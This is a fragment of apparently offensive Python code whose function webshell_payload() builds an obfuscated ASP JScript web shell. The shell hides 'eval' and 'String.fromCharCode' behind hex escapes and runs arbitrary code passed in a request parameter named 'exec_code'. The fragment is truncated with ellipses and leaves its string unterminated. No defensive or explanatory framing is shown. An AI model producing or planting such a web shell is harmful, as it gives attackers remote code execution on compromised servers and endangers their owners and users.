...
def webshell_payload():
    ...
    payload = '<script language="JScript" runat="server" Page aspcompat="true">
    function a() {
        var _0x6e8c=["\x65\x76\x61\x6C","\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"];
        var _0x1b6d=Request[_0x6e8c[1]]("exec_code");
        eval(_0x1b6d);
    }
